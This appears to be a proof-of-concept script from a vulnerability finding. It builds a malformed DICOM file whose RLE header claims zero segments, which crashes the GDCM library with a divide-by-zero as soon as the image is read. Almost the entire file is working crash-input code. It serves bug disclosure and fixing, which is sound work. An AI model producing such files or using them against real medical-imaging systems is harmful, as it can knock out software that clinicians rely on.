#!/usr/bin/env python3
"""
PoC generator for Finding 6: RLE NumSegments=0 divide-by-zero.

Bug: Source/MediaStorageAndFileFormat/gdcmRLECodec.cxx:840
     length /= numSegments;
RLEHeader::SetNumSegments() rejects num > 15 but accepts 0, so a fragment
whose 64-byte RLE header starts with NumSegments = 0 reaches the division
unchecked -> SIGFPE / UBSan division-by-zero.

Trigger: gdcm::ImageReader::Read() -- the RLE decode runs during
ComputeLossyFlag() inside Read() (this is a 2D image, so the divide is
reached via the NumberOfDimensions == 2 path), before any GetBuffer() call.
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(__file__), "c3_rle_divzero.dcm")


def encode_tag(group, element):
    return struct.pack("<HH", group, element)


def encode_ui(value):
    data = value.encode("ascii")
    if len(data) % 2 != 0:
        data += b"\x00"
    return data


def encode_cs(value):
    data = value.encode("ascii")
    if len(data) % 2 != 0:
        data += b" "
    return data


def explicit_vr_element(group, element, vr, value_bytes):
    tag = encode_tag(group, element)
    vr_bytes = vr.encode("ascii")
    length = len(value_bytes)

    # OB, OW, SQ, UC, UR, UT, UN use a 4-byte length preceded by 2 reserved bytes
    if vr in ("OB", "OW", "SQ", "UC", "UR", "UT", "UN"):
        header = tag + vr_bytes + b"\x00\x00" + struct.pack("<I", length)
    else:
        header = tag + vr_bytes + struct.pack("<H", length)

    return header + value_bytes


def explicit_vr_us(group, element, value):
    return explicit_vr_element(group, element, "US", struct.pack("<H", value))


def build_meta_header(body_bytes):
    meta_elements = b""
    meta_elements += explicit_vr_element(0x0002, 0x0001, "OB", b"\x00\x01")  # FileMetaInformationVersion
    meta_elements += explicit_vr_element(
        0x0002, 0x0002, "UI", encode_ui("1.2.840.10008.5.1.4.1.1.2")  # MediaStorageSOPClassUID: CT Image Storage
    )
    meta_elements += explicit_vr_element(
        0x0002, 0x0003, "UI", encode_ui("1.2.3.4.5.6.7.8.9")  # MediaStorageSOPInstanceUID
    )
    meta_elements += explicit_vr_element(
        0x0002, 0x0010, "UI", encode_ui("1.2.840.10008.1.2.5")  # TransferSyntaxUID: RLE Lossless
    )
    meta_elements += explicit_vr_element(
        0x0002, 0x0012, "UI", encode_ui("1.2.3.4.5.6.7.8")  # ImplementationClassUID
    )

    group_length = len(meta_elements)
    group_length_elem = explicit_vr_element(
        0x0002, 0x0000, "UL", struct.pack("<I", group_length)  # FileMetaInformationGroupLength
    )

    return group_length_elem + meta_elements


def build_rle_pixel_data():
    """
    Encapsulated PixelData whose single fragment is a 64-byte RLE header
    (uint32 NumSegments + uint32 Offset[15]) with every word zeroed, so
    NumSegments == 0 and no segment payload is needed to hit the bug.
    """
    rle_header = struct.pack("<16I", *([0] * 16))
    fragment_data = rle_header

    ITEM_TAG = b"\xfe\xff\x00\xe0"       # (FFFE,E000) Item
    SEQ_DELIM_TAG = b"\xfe\xff\xdd\xe0"  # (FFFE,E0DD) Sequence Delimitation Item

    bot = ITEM_TAG + struct.pack("<I", 0)  # empty Basic Offset Table
    fragment = ITEM_TAG + struct.pack("<I", len(fragment_data)) + fragment_data
    seq_delim = SEQ_DELIM_TAG + struct.pack("<I", 0)

    encapsulated = bot + fragment + seq_delim

    pixel_tag = encode_tag(0x7FE0, 0x0010)
    pixel_vr = b"OB"
    pixel_header = pixel_tag + pixel_vr + b"\x00\x00" + struct.pack("<I", 0xFFFFFFFF)

    return pixel_header + encapsulated


def build_dataset():
    ds = b""
    ds += explicit_vr_element(0x0008, 0x0016, "UI", encode_ui("1.2.840.10008.5.1.4.1.1.2"))  # SOPClassUID
    ds += explicit_vr_element(0x0008, 0x0018, "UI", encode_ui("1.2.3.4.5.6.7.8.9"))  # SOPInstanceUID
    ds += explicit_vr_us(0x0028, 0x0002, 1)  # SamplesPerPixel
    ds += explicit_vr_element(0x0028, 0x0004, "CS", encode_cs("MONOCHROME2"))  # PhotometricInterpretation
    ds += explicit_vr_us(0x0028, 0x0010, 4)  # Rows
    ds += explicit_vr_us(0x0028, 0x0011, 4)  # Columns
    ds += explicit_vr_us(0x0028, 0x0100, 8)  # BitsAllocated
    ds += explicit_vr_us(0x0028, 0x0101, 8)  # BitsStored
    ds += explicit_vr_us(0x0028, 0x0102, 7)  # HighBit
    ds += explicit_vr_us(0x0028, 0x0103, 0)  # PixelRepresentation
    ds += build_rle_pixel_data()
    return ds


def generate_poc():
    preamble = b"\x00" * 128 + b"DICM"
    dataset = build_dataset()
    meta = build_meta_header(dataset)
    dicom_bytes = preamble + meta + dataset

    with open(OUTPUT_FILE, "wb") as f:
        f.write(dicom_bytes)

    print(f"[+] Written: {OUTPUT_FILE} ({len(dicom_bytes)} bytes)")
    print(f"[*] Expected: division by zero at gdcmRLECodec.cxx:840")


if __name__ == "__main__":
    generate_poc()
